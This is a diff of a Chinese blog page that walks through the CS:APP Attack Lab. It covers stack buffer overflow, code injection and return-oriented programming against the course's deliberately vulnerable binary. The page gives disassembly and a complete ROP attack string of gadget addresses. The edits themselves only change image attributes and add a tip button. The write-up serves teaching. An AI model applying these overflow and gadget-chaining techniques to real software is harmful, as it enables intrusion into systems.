@@ -401,7 +401,7 @@
 <p>下面我们利用<code>objdump -d</code>命令将程序反汇编来查看<code>getbuf</code>函数的行为。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
 <p>代码比较简单，在第2行中将<code>rsp</code>减了0x28，申请了一块28字节的空间，第3行将<code>rsp</code>赋给<code>rdi</code>就是空间的首地址，然后调用了<code>Gets</code>函数，<code>rdi</code>就是它的参数。到这里我们可以确定<code>BUFFER_SIZE</code>的大小为0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在0x28字节的栈被<code>Gets</code>函数写满之后，多出来的字符会被写入<code>getbuf</code>函数的栈外。我们用图来说明栈的结构：</p>
-<p><img src="/images/attacklab01.png" alt=""></p>
+<p><img src="/images/attacklab01.png" alt></p>
 <p>下面是低地址，上面是高地址，在<code>getbuf</code>函数申请的0x28字节内存之外的8个字节存放的就是<code>test</code>函数<code>call</code>指令后下一条指令的地址。</p>
 <p>现在我们可以知道，我们需要用0x28字节来将栈填满，再写入<code>touch1</code>函数的入口地址，在<code>getbuf</code>函数执行到<code>ret</code>指令的时候就会返回到<code>touch1</code>中执行。</p>
 <p>下面就要利用官方提供的<code>hex2raw</code>程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。</p>
@@ -416,9 +416,9 @@
 <p>那么如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从<code>getbuf</code>函数返回的地址为我们栈中指令的首地址，在指令中执行<code>ret</code>进行第二次返回，返回到<code>touch2</code>函数，就可以实现我们的目的。</p>
 <p>所以我决定将指令写入到栈地址的最低处，然后在溢出后将地址设置为这个栈地址。我们能完成这个攻击的前提是讲义中已经告诉我们这个具有漏洞的程序在运行时的栈地址是固定的，不会因运行多次而改变，并且这个程序允许执行栈中的代码。</p>
 <p>我们利用<code>gdb</code>在运行时查看栈地址：</p>
-<p><img src="/images/attacklab02.png" alt=""></p>
+<p><img src="/images/attacklab02.png" alt></p>
 <p>停在<code>getbuf</code>的这里，然后查看<code>rsp</code>指向的地址：</p>
-<p><img src="/images/attacklab03.png" alt=""></p>
+<p><img src="/images/attacklab03.png" alt></p>
 <p>可以看到首地址为<code>0x5561dc78</code>，顺便看到第6行也就是0x28个字节之后存放的原返回地址。</p>
 <p>由于我们需要在注入的代码中再次返回，就需要将二次返回的地址同样存放在栈中，这里为了避免与我们注入的代码重叠，我选择将<code>touch2</code>地址放在<code>getbuf</code>函数栈的最后8字节中。</p>
 <p>下面就要生成攻击字符串了，首先我们需要生成攻击代码。我们先将攻击代码用汇编指令的形式写出来：</p>
@@ -431,7 +431,7 @@
 <p>仔细阅读上面的代码，我们需要传入<code>touch3</code>的参数是一个字符串的首地址，这个地址指向的字符串需要与<code>cookie</code>的字符串表示相同。这里<code>cookie</code>的字符串表示是<code>cookie</code>:<code>0x59b997fa</code>的<code>ASCII</code>表示的字符串：<code>35 39 62 39 39 37 66 61 00</code>。</p>
 <p>所以我们需要做的是将这串字符串放入栈中，并且将<code>rdi</code>的值置为字符串的首地址，再进行与上步类似的二次返回操作。</p>
 <p>这里我们需要好好考虑目标字符串在栈中的位置，下面是最终结果中的栈结构，先放出来便于讲解。</p>
-<p><img src="/images/attacklab04.png" alt=""></p>
+<p><img src="/images/attacklab04.png" alt></p>
 <p>如果目标字符串存放的位置比<code>touch3</code>存放地址更低，在最终字符串对比的时候会发现<code>rdi</code>指向地址的内容发生了改变。分析原因，我们可以查看从<code>getbuf</code>返回到字符串比对过程中执行的指令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  .</span><br><span class="line">  .</span><br><span class="line">  .</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:	41 54                	push   %r12</span><br><span class="line">  40184e:	55                   	push   %rbp</span><br><span class="line">  40184f:	53                   	push   %rbx</span><br></pre></td></tr></table></figure>
@@ -454,7 +454,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>这两条指令（指令的编码可以见讲义中的附录）。</p>
 <p>第1行的<code>movq</code>指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是<code>0x400f15</code>，这个地址也是这条指令的地址。我们可以通过计算得出<code>48 89 c7 c3</code>这条指令的首地址是<code>0x400f18</code>，我们只要把这个地址存放在栈中，在执行<code>ret</code>指令的时候就会跳转到这个地址，执行<code>48 89 c7 c3</code>编码的指令。同时，我们可以注意到这个指令的最后是<code>c3</code>编码的是<code>ret</code>指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次<code>ret</code>之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。</p>
-<p><img src="/images/attacklab05.png" alt=""></p>
+<p><img src="/images/attacklab05.png" alt></p>
 <p>这样的一串以<code>ret</code>结尾的指令，被称为<code>gadget</code>。我们要攻击的程序中为我们设置了一个<code>gadget_farm</code>，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中<code>start_farm</code>与<code>end_farm</code>函数标识之间的<code>gadget</code>来构建我们的攻击字符串。</p>
 <p>这种攻击方式被称为返回导向编程攻击。</p>
 <h4 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h4><p>目的与之前的<code>Level 2</code>相同，我们需要为<code>rdi</code>赋上<code>cookie</code>值，再跳转到<code>touch2</code>函数执行，跳转到<code>touch2</code>只需要将<code>touch2</code>的入口地址放在最后一个<code>gadget</code>之后，在它的<code>ret</code>指令执行之后就会返回到<code>touch2</code>中。</p>
@@ -482,11 +482,11 @@
 <p>有了这个，我们就可以把<code>rsp</code>的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。</p>
 <p>同时还要注意的是，这里有些<code>gadget</code>藏得比较隐蔽，讲义中暗示我们有一些两字节编码的指令实际上没有任何影响，它们之前的指令同样也是可以使用的。</p>
 <p>仔细找出所有可以执行的指令并整理之后我得出了这样一张图：</p>
-<p><img src="/images/attacklab06.png" alt=""></p>
+<p><img src="/images/attacklab06.png" alt></p>
 <p>目标字符串存放的位置一定在<code>touch3</code>地址之上（原因见前文）。</p>
 <p>由于相加操作只能对<code>rsi</code>与<code>rdi</code>进行，经过观察可以发现栈地址是一个8字节值，所以无法通过下面这条<code>movl</code>组成的路来传递，但是我们的偏移值完全可以。所以我们的思路就定下了，把<code>rsp</code>的值存放在<code>rdi</code>中，把偏移量的值通过<code>popq</code>指令从栈中取出放在<code>esi</code>中，再利用<code>add_xy</code>函数将它们相加的结果存放到<code>rax</code>再转移到<code>rdi</code>中。这个偏移量是多少要等到我们的栈结构出来之后才可以确定。</p>
 <p>根据上面这些信息，我们可以把栈结构示意出来：</p>
-<p><img src="/images/attacklab07.png" alt=""></p>
+<p><img src="/images/attacklab07.png" alt></p>
 <p>标注灰色的地方是我们计算偏移量的部分（从<code>rsp</code>读入时开始），可以计算出偏移量为<code>4 x 8 = 32 = 0x20</code>，再依此计算各命令的地址、构建出我们的攻击字符串：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00</span><br><span class="line">cc 19 40 00 00 00 00 00 # popq %rax</span><br><span class="line">20 00 00 00 00 00 00 00 # 偏移量</span><br><span class="line">42 1a 40 00 00 00 00 00 # movl %eax,%edx</span><br><span class="line">69 1a 40 00 00 00 00 00 # movl %edx,%ecx</span><br><span class="line">27 1a 40 00 00 00 00 00 # movl %ecx,%esi</span><br><span class="line">06 1a 40 00 00 00 00 00 # movq %rsp,%rax</span><br><span class="line">c5 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">d6 19 40 00 00 00 00 00 # add_xy</span><br><span class="line">c5 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00 # touch3地址</span><br><span class="line">35 39 62 39 39 37 66 61 # 目标字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <h3 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h3><p><code>Attack Lab</code>与之前的两个实验相比还是比较简单的，但是最后一个阶段确实因为自己的观察不够细致浪费了大量的时间。也告诉我们不要受思维定势的左右，一味地去寻找可以使用的<code>gadget</code>而忽略了函数本身的作用。</p>
@@ -498,6 +498,29 @@
     
     
         
+      
+        <div id="reward-container">
+  <div></div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/wechatpay.jpg" alt="viseator(吴迪) 微信支付">
+        <p>微信支付</p>
+      </div>
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/alipay.jpg" alt="viseator(吴迪) 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
       
         
 
